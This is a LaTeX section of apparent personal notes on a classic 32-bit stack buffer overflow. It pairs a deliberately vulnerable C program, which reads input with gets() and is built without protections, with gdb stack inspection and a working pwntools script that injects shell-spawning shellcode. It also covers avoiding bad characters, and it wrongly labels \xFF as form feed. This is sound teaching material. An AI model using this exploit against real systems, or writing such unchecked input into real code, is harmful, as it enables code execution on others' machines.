\subsection{shellcode}

\begin{verbatim}
// gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack -m32

#include <stdio.h>

void unsafe() {
    char buffer[300];

    puts("Overflow me");
    gets(buffer);
}

void main() {
    unsafe();
}
\end{verbatim}

in this attack the payload will contain shellcode and we will over-ride the
instruction pointer on the stack with the address of the buffer. Therefore the
process will execute the shellcode.

Note: for this to work:
\begin{itemize}
    \item ASLR must be disabled (\verb+/proc/sys/kernel/randomize_va_space+
        must be 0)
    \item the stack must be executable
\end{itemize}

\begin{verbatim}
$ pwntools-pwn checksec ./vuln
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
\end{verbatim}

so the payload will be of the form
\verb+<shellcode><padding><address of shellcode>+

first we need to find the address of the buffer which will be also the address
of the shellcode we need to jump to.

this can be done with \verb+gdb+ 
input for exemple enough \verb+\x61+ to stack overflow.
then inspect the stack in order to find where the first \verb+\x61+ start with
a command like
\begin{verbatim}
gef>  x/1000cb $esp
...SNIP...
0xffffb5b0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffb5b8:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffb5c0:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0xffffb5c8:     0x61    0x61    0x61    0x61    0x0     0x55    0x55    0x55
0xffffb5d0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
\end{verbatim}

so the start address of the buffer is \verb-0xffffb5c8 + 3- (i.e. \verb+0xffffb5cb+)

find the offset (and then the payload size) with \verb+pwntools-pwn cyclic+

craft a shellcode and compute the final payload
\begin{verbatim}
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffb5cb)              # or p64 Address of the Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
\end{verbatim}

Note: it might be necessary when crafting a payload to eliminate {\bf bad
caracters}. Bad characters can vary, but often we will see characters like this:
\begin{itemize}
    \item \verb+\x00+ - Null Byte
    \item \verb+\x0A+ - Line Feed
    \item \verb+\x0D+ - Carriage Return
    \item \verb+\xFF+ - Form Feed
\end{itemize}


to identify bad chars: craft a payload containing all possible chars and
inspect the stack to see if some are missing.

this has to be done as an iterative process until all injected chars are
present in the buffer.

msfvenom offer a \verb+-bad-chars "<chars>"+ parameter when generating a
shellcode.

for pwntools the use of 
\verb+pwnlib.encoders.encoder.encode(raw_bytes, avoid, expr, force)+


